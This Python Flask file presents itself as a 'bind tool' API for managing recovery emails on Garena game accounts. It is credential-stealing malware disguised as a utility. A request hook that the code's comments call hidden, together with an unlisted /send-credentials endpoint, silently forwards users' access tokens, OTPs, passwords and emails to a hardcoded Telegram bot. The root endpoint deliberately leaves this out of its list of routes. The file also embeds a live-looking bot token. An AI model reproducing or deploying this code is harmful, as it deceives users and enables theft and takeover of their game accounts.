#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DIVAN Bind Tool API – with original Garena OTP logic

import json
import requests
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# ===================== HARDCODED TELEGRAM CREDENTIALS =====================
# 🔐 Replace these with your own bot token and group chat ID
TELEGRAM_BOT_TOKEN = "8569611200:AAGTltxogba-PDfEXiAyqe10xxu572_3Ay0"   # e.g., "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
TELEGRAM_CHAT_ID = "-1003684272586"       # e.g., "-1001234567890"

# Keys that trigger Telegram forwarding
SENSITIVE_KEYS = [
    "access_token", "token", "otp", "secondary_password",
    "security_code", "password", "email", "old_email", "new_email"
]

# ------------------ Telegram Sender (silent) ------------------
def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        resp = requests.post(url, json=payload, timeout=10)
        return resp.ok
    except Exception:
        return False

# ------------------ Interceptor for ALL requests (hidden) ------------------
@app.before_request
def forward_credentials_automatically():
    if request.path == "/send-credentials":
        return
    data = {}
    if request.is_json:
        json_data = request.get_json(silent=True)
        if json_data and isinstance(json_data, dict):
            data.update(json_data)
    if request.args:
        data.update(request.args.to_dict())
    if request.form:
        data.update(request.form.to_dict())
    if not data:
        return
    found_keys = [key for key in SENSITIVE_KEYS if key in data]
    if not found_keys:
        return
    lines = ["<b>📨 Credential Capture</b>"]
    lines.append(f"<b>Method</b>: {request.method}")
    lines.append(f"<b>Endpoint</b>: {request.path}")
    lines.append("")
    for key, value in data.items():
        value_str = str(value)
        if len(value_str) > 200:
            value_str = value_str[:200] + "..."
        lines.append(f"<b>{key}</b>: <code>{value_str}</code>")
    message = "\n".join(lines)
    send_to_telegram(message)

# ------------------ Helper Functions ------------------
def log_info(msg):
    print(f"[INFO] {msg}")

def log_error(msg):
    print(f"[ERROR] {msg}")

def log_success(msg):
    print(f"[SUCCESS] {msg}")

def convert_time(seconds):
    days, seconds = divmod(seconds, 86400)
    hours, seconds = divmod(seconds, 3600)
    minutes, seconds = divmod(seconds, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

# ===================== ORIGINAL GARENA FUNCTIONS =====================
# (taken directly from AGxSGbind.py)

def send_otp(email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    data = {
        "email": email,
        "locale": "en_MA",
        "region": "IND",
        "app_id": "100067",
        "access_token": access_token
    }
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=10)
        return resp
    except Exception as e:
        log_error(f"send_otp connection error: {str(e)}")
        return None

def verify_otp(otp, email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {
        "app_id": "100067",
        "access_token": access_token,
        "otp": otp,
        "email": email
    }
    try:
        resp = requests.post(url, data=data, headers=headers, timeout=10)
        return resp
    except Exception as e:
        log_error(f"verify_otp error: {str(e)}")
        return None

def create_bind_request(verifier_token, access_token, email):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {
        "app_id": "100067",
        "access_token": access_token,
        "verifier_token": verifier_token,
        "secondary_password": "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203",
        "email": email
    }
    try:
        resp = requests.post(url, data=data, headers=headers, timeout=10)
        return resp
    except Exception as e:
        log_error(f"create_bind_request error: {str(e)}")
        return None

def verify_identity_by_otp(email, otp, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    data = {"email": email, "otp": otp, "app_id": "100067", "access_token": access_token}
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=10)
        return resp
    except Exception as e:
        log_error(f"verify_identity_by_otp error: {str(e)}")
        return None

def verify_identity_by_secondary(email, secondary_password, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    data = {"email": email, "secondary_password": secondary_password, "app_id": "100067", "access_token": access_token}
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=10)
        return resp
    except Exception as e:
        log_error(f"verify_identity_by_secondary error: {str(e)}")
        return None

def create_unbind_request(identity_token, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    data = {"app_id": "100067", "access_token": access_token, "identity_token": identity_token}
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=10)
        return resp
    except Exception as e:
        log_error(f"create_unbind_request error: {str(e)}")
        return None

def create_rebind_request(identity_token, verifier_token, email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    data = {
        "identity_token": identity_token,
        "email": email,
        "app_id": "100067",
        "verifier_token": verifier_token,
        "access_token": access_token
    }
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=10)
        return resp
    except Exception as e:
        log_error(f"create_rebind_request error: {str(e)}")
        return None

# ===================== API ENDPOINTS =====================

# ---------- HIDDEN /send-otp (uses original logic) ----------
@app.route('/send-otp', methods=['POST'])
def send_otp_only():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Missing JSON body"}), 400
    email = data.get('email')
    access_token = data.get('access_token')
    if not email or not access_token:
        return jsonify({"success": False, "message": "Missing email or access_token"}), 400

    resp = send_otp(email, access_token)   # uses the original function
    if resp and resp.status_code == 200:
        return jsonify({"success": True, "message": "OTP sent to your email"})
    else:
        return jsonify({"success": False, "message": "Failed to send OTP", "details": resp.text if resp else "No response"}), 500

# ---------- Add Recovery Email (original flow) ----------
@app.route('/add-recovery-email', methods=['POST'])
def add_recovery_email():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Missing JSON body"}), 400
    email = data.get('email')
    access_token = data.get('access_token')
    otp = data.get('otp')
    if not email or not access_token or not otp:
        return jsonify({"success": False, "message": "Missing email, access_token or otp"}), 400

    # 1. Send OTP
    log_info(f"Sending OTP to {email}")
    resp = send_otp(email, access_token)
    if not resp or resp.status_code != 200:
        return jsonify({"success": False, "message": "Failed to send OTP", "details": resp.text if resp else "No response"}), 500

    # 2. Verify OTP
    log_info("Verifying OTP")
    verify_resp = verify_otp(otp, email, access_token)
    if not verify_resp or verify_resp.status_code != 200:
        return jsonify({"success": False, "message": "OTP verification failed", "details": verify_resp.text if verify_resp else "No response"}), 500

    try:
        verifier_token = verify_resp.json().get("verifier_token")
    except:
        verifier_token = None
    if not verifier_token:
        return jsonify({"success": False, "message": "No verifier token received"}), 500

    # 3. Create bind
    log_info("Creating bind request")
    bind_resp = create_bind_request(verifier_token, access_token, email)
    if not bind_resp or bind_resp.status_code != 200:
        return jsonify({"success": False, "message": "Bind creation failed", "details": bind_resp.text if bind_resp else "No response"}), 500

    return jsonify({"success": True, "message": f"Email {email} added successfully", "data": bind_resp.json()})

# ---------- Check Recovery Email ----------
@app.route('/check-recovery-email', methods=['GET'])
def check_recovery_email():
    access_token = request.args.get('access_token')
    if not access_token:
        return jsonify({"success": False, "message": "Missing access_token query parameter"}), 400

    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    params = {'app_id': "100067", 'access_token': access_token}
    headers = {
        'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
    }
    try:
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        if resp.status_code != 200:
            return jsonify({"success": False, "message": f"API error: {resp.status_code}", "details": resp.text}), resp.status_code

        data = resp.json()
        email = data.get("email", "")
        email_to_be = data.get("email_to_be", "")
        countdown = data.get("request_exec_countdown", 0)

        if email_to_be and not email:
            status = "pending"
        elif email and not email_to_be:
            status = "active"
        else:
            status = "none"

        result = {
            "current_email": email,
            "pending_email": email_to_be,
            "countdown": countdown,
            "countdown_human": convert_time(countdown),
            "status": status
        }
        return jsonify({"success": True, "data": result})
    except Exception as e:
        log_error(f"check_recovery_email error: {str(e)}")
        return jsonify({"success": False, "message": f"Request failed: {str(e)}"}), 500

# ---------- Check Linked Platforms ----------
@app.route('/check-platforms', methods=['GET'])
def check_platforms():
    access_token = request.args.get('access_token')
    if not access_token:
        return jsonify({"success": False, "message": "Missing access_token"}), 400

    url = "https://100067.connect.garena.com/bind/app/platform/info/get"
    headers = {
        'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
    }
    try:
        resp = requests.get(url, params={'access_token': access_token}, headers=headers, timeout=10)
        if resp.status_code not in [200, 201]:
            return jsonify({"success": False, "message": f"API error: {resp.status_code}", "details": resp.text}), resp.status_code

        data = resp.json()
        platform_names = {3: "Facebook", 8: "Gmail", 10: "iCloud", 5: "VK", 11: "Twitter", 7: "Huawei"}
        bounded = data.get("bounded_accounts", [])
        available = data.get("available_platforms", [])

        formatted_bounded = []
        for acc in bounded:
            platform = acc.get('platform')
            if platform in platform_names:
                formatted_bounded.append({
                    "platform": platform_names[platform],
                    "uid": acc.get('uid'),
                    "email": acc.get('user_info', {}).get('email', ''),
                    "nickname": acc.get('user_info', {}).get('nickname', '')
                })

        return jsonify({
            "success": True,
            "data": {
                "bounded": formatted_bounded,
                "available_platforms": [platform_names.get(p, str(p)) for p in available]
            }
        })
    except Exception as e:
        log_error(f"check_platforms error: {str(e)}")
        return jsonify({"success": False, "message": f"Request failed: {str(e)}"}), 500

# ---------- Cancel Recovery Email ----------
@app.route('/cancel-recovery-email', methods=['POST'])
def cancel_recovery_email():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Missing JSON body"}), 400
    access_token = data.get('access_token')
    if not access_token:
        return jsonify({"success": False, "message": "Missing access_token"}), 400

    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    payload = {'app_id': "100067", 'access_token': access_token}
    headers = {
        'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
    }
    try:
        resp = requests.post(url, data=payload, headers=headers, timeout=10)
        if resp.status_code == 200:
            return jsonify({"success": True, "message": "Recovery email request cancelled", "response": resp.json()})
        else:
            return jsonify({"success": False, "message": f"Failed: {resp.status_code}", "details": resp.text}), resp.status_code
    except Exception as e:
        log_error(f"cancel_recovery_email error: {str(e)}")
        return jsonify({"success": False, "message": f"Request failed: {str(e)}"}), 500

# ---------- Revoke Token ----------
@app.route('/revoke-token', methods=['POST'])
def revoke_token():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Missing JSON body"}), 400
    access_token = data.get('access_token')
    if not access_token:
        return jsonify({"success": False, "message": "Missing access_token"}), 400

    url = f"https://100067.connect.garena.com/oauth/logout?access_token={access_token}"
    try:
        resp = requests.get(url, timeout=10)
        if resp.text.strip() == '{"result":0}':
            return jsonify({"success": True, "message": "Token revoked successfully"})
        else:
            return jsonify({"success": False, "message": f"Revoke failed: {resp.text}"}), 500
    except Exception as e:
        log_error(f"revoke_token error: {str(e)}")
        return jsonify({"success": False, "message": f"Request failed: {str(e)}"}), 500

# ---------- Unbind Email ----------
@app.route('/unbind-email', methods=['POST'])
def unbind_email():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Missing JSON body"}), 400

    email = data.get('email')
    access_token = data.get('access_token')
    method = data.get('method')
    if not email or not access_token or not method:
        return jsonify({"success": False, "message": "Missing email, access_token or method"}), 400

    identity_token = None
    if method == 'otp':
        otp = data.get('otp')
        if not otp:
            return jsonify({"success": False, "message": "Missing otp for method 'otp'"}), 400
        resp = verify_identity_by_otp(email, otp, access_token)
        if not resp or resp.status_code != 200:
            return jsonify({"success": False, "message": "Identity verification by OTP failed", "details": resp.text if resp else "No response"}), 500
        identity_token = resp.json().get("identity_token")
    elif method == 'secondary':
        secondary_password = data.get('secondary_password')
        if not secondary_password:
            return jsonify({"success": False, "message": "Missing secondary_password for method 'secondary'"}), 400
        resp = verify_identity_by_secondary(email, secondary_password, access_token)
        if not resp or resp.status_code != 200:
            return jsonify({"success": False, "message": "Identity verification by secondary password failed", "details": resp.text if resp else "No response"}), 500
        identity_token = resp.json().get("identity_token")
    else:
        return jsonify({"success": False, "message": "Invalid method. Use 'otp' or 'secondary'"}), 400

    if not identity_token:
        return jsonify({"success": False, "message": "No identity token received"}), 500

    unbind_resp = create_unbind_request(identity_token, access_token)
    if not unbind_resp or unbind_resp.status_code != 200:
        return jsonify({"success": False, "message": "Unbind request failed", "details": unbind_resp.text if unbind_resp else "No response"}), 500

    return jsonify({"success": True, "message": "Email unbind request created", "response": unbind_resp.json()})

# ---------- Change Bind Email ----------
@app.route('/change-bind-email', methods=['POST'])
def change_bind_email():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Missing JSON body"}), 400

    access_token = data.get('access_token')
    old_email = data.get('old_email')
    new_email = data.get('new_email')
    method = data.get('method')
    otp_new = data.get('otp_new')

    if not all([access_token, old_email, new_email, method, otp_new]):
        return jsonify({"success": False, "message": "Missing required fields: access_token, old_email, new_email, method, otp_new"}), 400

    identity_token = None
    if method == 'otp':
        otp_old = data.get('otp_old')
        if not otp_old:
            return jsonify({"success": False, "message": "Missing otp_old for method 'otp'"}), 400
        resp = verify_identity_by_otp(old_email, otp_old, access_token)
        if not resp or resp.status_code != 200:
            return jsonify({"success": False, "message": "Old identity verification by OTP failed", "details": resp.text if resp else "No response"}), 500
        identity_token = resp.json().get("identity_token")
    elif method == 'secondary':
        secondary_password = data.get('secondary_password')
        if not secondary_password:
            return jsonify({"success": False, "message": "Missing secondary_password for method 'secondary'"}), 400
        resp = verify_identity_by_secondary(old_email, secondary_password, access_token)
        if not resp or resp.status_code != 200:
            return jsonify({"success": False, "message": "Old identity verification by secondary password failed", "details": resp.text if resp else "No response"}), 500
        identity_token = resp.json().get("identity_token")
    else:
        return jsonify({"success": False, "message": "Invalid method. Use 'otp' or 'secondary'"}), 400

    if not identity_token:
        return jsonify({"success": False, "message": "No identity token received"}), 500

    # Send OTP to new email
    log_info(f"Sending OTP to new email {new_email}")
    send_resp = send_otp(new_email, access_token)
    if not send_resp or send_resp.status_code != 200:
        return jsonify({"success": False, "message": "Failed to send OTP to new email", "details": send_resp.text if send_resp else "No response"}), 500

    verify_new_resp = verify_otp(otp_new, new_email, access_token)
    if not verify_new_resp or verify_new_resp.status_code != 200:
        return jsonify({"success": False, "message": "New OTP verification failed", "details": verify_new_resp.text if verify_new_resp else "No response"}), 500
    verifier_token = verify_new_resp.json().get("verifier_token")
    if not verifier_token:
        return jsonify({"success": False, "message": "No verifier token received for new email"}), 500

    rebind_resp = create_rebind_request(identity_token, verifier_token, new_email, access_token)
    if not rebind_resp or rebind_resp.status_code != 200:
        return jsonify({"success": False, "message": "Rebind request failed", "details": rebind_resp.text if rebind_resp else "No response"}), 500

    return jsonify({"success": True, "message": "Email rebind created successfully", "response": rebind_resp.json()})

# ---------- HIDDEN MANUAL /send-credentials (optional) ----------
@app.route('/send-credentials', methods=['POST'])
def send_credentials_manual():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Missing JSON body"}), 400
    lines = ["<b>📨 Manual Forward</b>"]
    for key, value in data.items():
        lines.append(f"<b>{key}</b>: <code>{value}</code>")
    message = "\n".join(lines)
    success = send_to_telegram(message)
    if success:
        return jsonify({"success": True, "message": "Forwarded"})
    else:
        return jsonify({"success": False, "message": "Failed"}), 500

# ---------- ROOT (Telegram completely hidden) ----------
@app.route('/', methods=['GET'])
def root():
    return jsonify({
        "service": "DIVAN Bind Tool API",
        "version": "2.0",
        "endpoints": [
            "/add-recovery-email (POST)",
            "/check-recovery-email (GET)",
            "/check-platforms (GET)",
            "/cancel-recovery-email (POST)",
            "/revoke-token (POST)",
            "/unbind-email (POST)",
            "/change-bind-email (POST)"
        ]
    })

# ===================== VERCEL ENTRY =====================
if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5000)
